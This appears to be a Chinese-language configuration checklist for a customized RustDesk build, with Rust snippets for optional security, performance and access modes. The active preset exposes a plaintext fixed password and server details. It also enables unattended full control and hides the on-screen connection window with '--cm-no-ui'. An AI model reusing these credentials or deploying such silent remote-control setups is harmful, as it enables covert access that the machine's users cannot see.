# RustDesk 预设配置清单

## ✅ 当前已配置项

### 🌐 服务器配置
| 配置项 | 值 | 说明 |
|--------|-----|------|
| ID 服务器 | 39.97.50.6 | 主服务器地址 |
| Relay 服务器 | 39.97.50.6 | 中继服务器 |
| API 服务器 | http://39.97.50.6 | API 接口地址 |
| 服务器秘钥 | c77HeYQce1GVUCnx2YSyrYxJ1f5GYcyrvUufE8r0toU= | 服务器公钥 |

### 🔐 密码配置
| 配置项 | 值 | 说明 |
|--------|-----|------|
| 固定密码 | 28b5hD8S26 | 远程管理密码 |
| 临时密码 | 禁用 | 不使用临时密码 |
| 验证方式 | use-permanent-password | 仅使用固定密码 |

### 🎯 访问控制
| 配置项 | 值 | 说明 |
|--------|-----|------|
| 访问模式 | full | 完全控制权限 |
| 授权模式 | password | 密码验证后自动授权 |
| Windows CM | --cm-no-ui | 不弹出管理窗口 |

### 🎮 功能权限
| 功能 | 状态 | 说明 |
|------|------|------|
| 键盘控制 | ✅ 启用 | 允许远程键盘输入 |
| 鼠标控制 | ✅ 启用 | 允许远程鼠标操作 |
| 剪贴板同步 | ✅ 启用 | 支持剪贴板共享 |
| 文件传输 | ✅ 启用 | 支持文件上传下载 |
| 音频传输 | ✅ 启用 | 支持音频流传输 |

### ⚡ 性能优化
| 配置项 | 值 | 说明 |
|--------|-----|------|
| 硬件编码 | ✅ 启用 | 使用 GPU 加速 |
| 图像质量 | balanced | 平衡模式 |
| 自动更新 | ❌ 禁用 | 禁止自动更新 |

---

## 🔧 建议的可选配置

### 1. 安全增强配置

#### 启用会话录制（审计用）
```rust
// 在 src/default_config.rs 的 set_recommended_defaults() 中添加

// 启用会话录制
Config::set_option("enable-record-session".to_string(), "Y".to_string());

// 自动录制所有入站连接
Config::set_option("allow-auto-record-incoming".to_string(), "Y".to_string());

// 设置录像保存路径（可选）
LocalConfig::set_option("video-save-directory".to_string(), "C:\\RustDesk\\Records".to_string());
```

**效果**: 所有远程连接会话自动录制，用于审计和回溯。

#### 限制连接时长
```rust
// 自动断开超时设置
Config::set_option("allow-auto-disconnect".to_string(), "Y".to_string());
Config::set_option("auto-disconnect-timeout".to_string(), "60".to_string()); // 60分钟后自动断开
```

**效果**: 防止长时间占用连接，60分钟后自动断开。

#### 禁用局域网发现
```rust
// 强制使用服务器，不在局域网内自动发现
Config::set_option("enable-lan-discovery".to_string(), "N".to_string());
```

**效果**: 所有连接都通过服务器中转，便于统一管理和监控。

#### 禁用直接 IP 连接
```rust
// 强制使用服务器中继，禁止点对点直连
Config::set_option("direct-server".to_string(), "N".to_string());
```

**效果**: 即使在同一局域网，也通过服务器中继，更安全但性能稍降。

---

### 2. 权限限制配置

#### 仅允许查看模式（只读）
```rust
// 替换 set_full_access_mode() 中的内容
Config::set_option("access-mode".to_string(), "view".to_string());
Config::set_option("enable-keyboard".to_string(), "N".to_string());
Config::set_option("enable-clipboard".to_string(), "N".to_string());
Config::set_option("enable-file-transfer".to_string(), "N".to_string());
```

**效果**: 仅允许远程查看屏幕，不能控制。适合演示或监控场景。

#### 禁用文件传输
```rust
// 如果不需要文件传输功能
Config::set_option("enable-file-transfer".to_string(), "N".to_string());
```

**效果**: 防止通过远程桌面传输文件，提升安全性。

#### 禁用剪贴板同步
```rust
// 如果不需要剪贴板共享
Config::set_option("enable-clipboard".to_string(), "N".to_string());
```

**效果**: 防止敏感数据通过剪贴板泄露。

---

### 3. 性能优化配置

#### 设置最佳图像质量
```rust
// 如果网络条件好，可以使用最佳质量
Config::set_option("image-quality".to_string(), "best".to_string());
```

**效果**: 更清晰的画面，但占用更多带宽。

#### 设置低质量模式
```rust
// 如果网络条件差，使用低质量节省带宽
Config::set_option("image-quality".to_string(), "low".to_string());
```

**效果**: 降低带宽占用，适合远程或移动网络。

#### 调整帧率
```rust
// 设置帧率限制（可选值：15, 30, 60）
Config::set_option("custom-fps".to_string(), "30".to_string());
```

**效果**: 平衡流畅度和带宽占用。

---

### 4. 用户体验配置

#### 自动接受会话（谨慎使用）
```rust
// 完全无人值守，自动接受所有连接（高风险）
Config::set_option("access-mode".to_string(), "full".to_string());
Config::set_option("approve-mode".to_string(), "password".to_string());
```

**效果**: 输入密码后立即连接，无需被控端确认。**当前已启用**。

#### 显示连接通知
```rust
// 在被控端显示连接通知（默认行为）
// 当前已通过 --cm-no-ui 禁用了 CM 窗口
```

---

### 5. 网络配置

#### 设置 SOCKS5 代理
```rust
// 如果需要通过代理连接
use hbb_common::config::Socks5Server;

let proxy = Socks5Server {
    proxy: "127.0.0.1:1080".to_string(),
    username: "".to_string(),
    password: "".to_string(),
};
Config::set_socks(Some(proxy));
```

**效果**: 所有连接通过 SOCKS5 代理。

#### 禁用 UDP 打孔
```rust
// 强制使用 TCP，禁用 UDP
Config::set_option("disable-udp".to_string(), "Y".to_string());
```

**效果**: 在某些网络环境下更稳定，但可能降低性能。

---

### 6. 企业级配置组合

#### 方案A: 高安全模式
```rust
pub fn set_high_security_mode() {
    // 服务器配置
    set_custom_server();
    set_fixed_password();
    
    // 限制权限
    Config::set_option("access-mode".to_string(), "view".to_string()); // 仅查看
    Config::set_option("enable-file-transfer".to_string(), "N".to_string()); // 禁止文件传输
    Config::set_option("enable-clipboard".to_string(), "N".to_string()); // 禁止剪贴板
    
    // 启用审计
    Config::set_option("enable-record-session".to_string(), "Y".to_string());
    Config::set_option("allow-auto-record-incoming".to_string(), "Y".to_string());
    
    // 限制连接时长
    Config::set_option("allow-auto-disconnect".to_string(), "Y".to_string());
    Config::set_option("auto-disconnect-timeout".to_string(), "30".to_string());
    
    // 强制中继
    Config::set_option("direct-server".to_string(), "N".to_string());
    
    log::info!("✅ 已启用高安全模式");
}
```

#### 方案B: 无人值守模式（当前使用）
```rust
pub fn set_unattended_mode() {
    // 服务器配置
    set_custom_server();
    set_fixed_password();
    
    // 完全权限
    Config::set_option("access-mode".to_string(), "full".to_string());
    Config::set_option("approve-mode".to_string(), "password".to_string());
    
    // 所有功能启用
    Config::set_option("enable-keyboard".to_string(), "Y".to_string());
    Config::set_option("enable-clipboard".to_string(), "Y".to_string());
    Config::set_option("enable-file-transfer".to_string(), "Y".to_string());
    Config::set_option("enable-audio".to_string(), "Y".to_string());
    
    // 性能优化
    Config::set_option("enable-hwcodec".to_string(), "Y".to_string());
    
    log::info!("✅ 已启用无人值守模式");
}
```

#### 方案C: 平衡模式
```rust
pub fn set_balanced_mode() {
    // 服务器配置
    set_custom_server();
    set_fixed_password();
    
    // 需要确认的控制
    Config::set_option("access-mode".to_string(), "full".to_string());
    Config::set_option("approve-mode".to_string(), "password-click".to_string()); // 密码+点击确认
    
    // 基本功能
    Config::set_option("enable-keyboard".to_string(), "Y".to_string());
    Config::set_option("enable-clipboard".to_string(), "Y".to_string());
    Config::set_option("enable-file-transfer".to_string(), "N".to_string()); // 禁止文件传输
    
    // 会话录制
    Config::set_option("enable-record-session".to_string(), "Y".to_string());
    
    log::info!("✅ 已启用平衡模式");
}
```

---

## 📊 配置对比

| 特性 | 当前配置<br>(无人值守) | 高安全模式 | 平衡模式 |
|------|------------|-----------|---------|
| 自动授权 | ✅ 是 | ❌ 否 | ⚠️ 需点击 |
| 键盘控制 | ✅ 允许 | ❌ 禁止 | ✅ 允许 |
| 文件传输 | ✅ 允许 | ❌ 禁止 | ❌ 禁止 |
| 剪贴板 | ✅ 允许 | ❌ 禁止 | ✅ 允许 |
| 会话录制 | ❌ 未启用 | ✅ 强制 | ✅ 启用 |
| 连接时长 | ♾️ 无限制 | ⏱️ 30分钟 | ♾️ 无限制 |
| 适用场景 | 内网运维 | 敏感系统 | 一般办公 |

---

## 🎯 推荐配置

根据你的使用场景，选择合适的配置：

### 场景1: 内网服务器运维（当前配置）
✅ **当前配置已完美适配**
- 无人值守自动连接
- 完全控制权限
- 固定密码管理
- 自建服务器通信

### 场景2: 远程技术支持
建议添加：
```rust
// 启用会话录制（审计）
Config::set_option("enable-record-session".to_string(), "Y".to_string());

// 限制连接时长
Config::set_option("allow-auto-disconnect".to_string(), "Y".to_string());
Config::set_option("auto-disconnect-timeout".to_string(), "60".to_string());
```

### 场景3: 远程监控/演示
建议修改为：
```rust
// 仅查看模式
Config::set_option("access-mode".to_string(), "view".to_string());

// 禁止所有控制
Config::set_option("enable-keyboard".to_string(), "N".to_string());
Config::set_option("enable-file-transfer".to_string(), "N".to_string());
```

---

## ⚠️ 安全提醒

当前配置适用于：
- ✅ 企业内网环境
- ✅ VPN 保护的网络
- ✅ 可信任的管理员团队

**不适用于**：
- ❌ 直接暴露在公网
- ❌ 未授权的第三方访问
- ❌ 不受控的终端设备

---

## 📝 配置修改方法

所有配置修改都在 `src/default_config.rs` 文件中：

1. 找到对应的配置函数
2. 修改配置值
3. 重新编译：`cargo build --release --features default_config`
4. 重新部署

**修改后记得测试验证！**
